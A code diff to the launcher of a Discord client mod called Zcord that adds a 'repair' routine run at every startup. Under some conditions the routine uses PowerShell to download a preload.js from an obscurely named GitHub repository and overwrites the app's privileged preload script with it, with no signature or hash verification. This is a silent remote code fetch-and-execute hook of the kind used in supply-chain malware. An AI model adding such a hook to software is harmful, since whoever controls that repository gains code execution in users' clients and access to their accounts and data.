@@ -168,4 +168,52 @@ if (!gotLock) {
     });
 }
 
+/** preload.js legacy (aout 2025) = pas d'injection Zcord / Plugins */
+function repairLegacyPreload() {
+    const desktopDir = path.join(__dirname, "dist", "desktop");
+    const preloadPath = path.join(desktopDir, "preload.js");
+    const refPath = path.join(desktopDir, "preload.ref.js");
+
+    if (!fs.existsSync(preloadPath)) return;
+
+    const body = fs.readFileSync(preloadPath, "utf8");
+    const isLegacy = body.includes("Equicord avec contextBridge")
+        || (body.includes("Zcord preload") && !body.includes("//# sourceURL=file:///VencordPreload"));
+
+    if (!isLegacy) return;
+
+    console.warn("[Zcord] preload.js obsolete — reparation...");
+
+    if (fs.existsSync(refPath)) {
+        try {
+            fs.copyFileSync(refPath, preloadPath);
+            console.log("[Zcord] preload.js repare (preload.ref.js)");
+            return;
+        } catch (e) {
+            console.warn("[Zcord] preload.ref.js echoue:", e?.message);
+        }
+    }
+
+    const url = "https://github.com/devdee162-web/qsddddddddddddddddddddddddsq/releases/latest/download/f_resources__app__dist__desktop__preload.js";
+    const tmp = path.join(require("os").tmpdir(), `zcord-preload-${Date.now()}.js`);
+    try {
+        const { execSync } = require("child_process");
+        execSync(
+            `powershell -NoProfile -Command "Invoke-WebRequest -Uri '${url}' -OutFile '${tmp.replace(/'/g, "''")}' -UseBasicParsing"`,
+            { stdio: "pipe", timeout: 120000 }
+        );
+        if (fs.existsSync(tmp) && fs.statSync(tmp).size > 1000) {
+            fs.copyFileSync(tmp, preloadPath);
+            try { fs.copyFileSync(tmp, refPath); } catch (_) {}
+            console.log("[Zcord] preload.js repare (GitHub latest)");
+        }
+    } catch (e) {
+        console.error("[Zcord] Reparation preload impossible:", e?.message);
+    } finally {
+        try { fs.rmSync(tmp, { force: true }); } catch (_) {}
+    }
+}
+
+repairLegacyPreload();
+
 require(path.join(__dirname, "dist", "desktop", "patcher.js"));
